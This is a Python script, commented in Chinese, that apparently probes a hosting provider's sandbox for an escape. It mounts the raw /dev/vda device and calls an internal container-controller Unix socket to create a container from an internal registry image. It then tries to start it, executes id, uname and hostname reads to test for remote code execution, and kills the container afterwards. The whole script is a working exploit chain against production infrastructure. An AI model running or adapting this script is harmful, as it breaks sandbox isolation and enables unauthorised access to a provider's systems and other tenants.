# -*- coding: utf-8 -*-
"""vda12_container_chain: Create(@digest) -> Start -> Exec -> Kill 完整链
1) Create 成功拿 containerId (正则兼容 camelCase)
2) Start 容器 (container_id snake_case 变体)
3) Exec id/uname (观察是否 cell 级 RCE)
4) 进程/挂载观测 + Kill 清理
输出落盘 + 哨兵 V12Y_DONE"""
import os, time, socket, ctypes, re, subprocess

OUT = '/vercel/sandbox/v12y.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rpc_unix(sockpath, path, body='{}', t=8):
    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect(sockpath)
        req = ('POST %s HTTP/1.1\r\nHost: unix\r\nContent-Type: application/json\r\n'
               'Content-Length: %d\r\nConnection: close\r\n\r\n%s' % (path, len(body), body))
        s.sendall(req.encode())
        data = b''
        while True:
            try:
                chunk = s.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            data += chunk
        s.close()
        if not data:
            return 'NORESP', ''
        head, _, rest = data.partition(b'\r\n\r\n')
        return head.split(b'\r\n')[0].decode(errors='replace'), rest[:500].decode(errors='replace')
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, ''


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    sp = '/mnt/vdax/run/cell/cell.sock'
    IMG = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'

    # P1: Create
    log('=== P1 Create ===')
    cid = None
    body = '{"image":"%s"}' % IMG
    st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Create', body, t=15)
    log('create -> %s | %s' % (st, bd[:300]))
    m = re.search(r'"containerId":\s*"([^"]+)"', bd)
    if m:
        cid = m.group(1)
        log('CID=%s' % cid)

    # P2: Start 变体
    if cid:
        log('=== P2 Start ===')
        for body in ['{"container_id":"%s"}' % cid, '{"containerId":"%s"}' % cid,
                     '{"container_id":"%s","command":"/bin/sleep 600"}' % cid]:
            st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Start', body, t=8)
            log('start %-70s -> %s | %s' % (body, st, bd[:250].replace('\n', ' ')))
            time.sleep(0.5)
            if '404' not in st:
                break

    # P3: Exec 变体
    log('=== P3 Exec ===')
    exec_bodies = ['{"command":"id"}']
    if cid:
        exec_bodies = ['{"container_id":"%s","command":"id"}' % cid,
                       '{"containerId":"%s","command":"id"}' % cid,
                       '{"container_id":"%s","command":"/bin/sh -c id; uname -a; cat /etc/hostname"}' % cid]
    for body in exec_bodies:
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Exec', body, t=8)
        log('exec %-90s -> %s | %s' % (body, st, bd[:300].replace('\n', ' ')))
        time.sleep(0.5)

    # P4: 观测 + Kill
    if cid:
        log('=== P4 observe & kill ===')
        try:
            r = subprocess.run(['sh', '-c', 'ls /proc | grep -E "^[0-9]+$" | wc -l; cat /proc/self/mountinfo | grep -c "overlay\\|/mnt/vdax"'], capture_output=True, timeout=10)
            log('proc/mount: %s' % r.stdout.decode(errors='replace').strip())
        except Exception as e:
            log('obs ERR %s' % e)
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Kill',
                          '{"container_id":"%s"}' % cid, t=5)
        log('kill -> %s | %s' % (st, bd[:150]))
        st, bd = rpc_unix(sp, '/vercel.hive.cell.api.containers.v1.ContainersService/Kill',
                          '{"containerId":"%s"}' % cid, t=5)
        log('kill2 -> %s | %s' % (st, bd[:150]))

    log('V12Y_DONE')
    f.close()


if __name__ == '__main__':
    main()
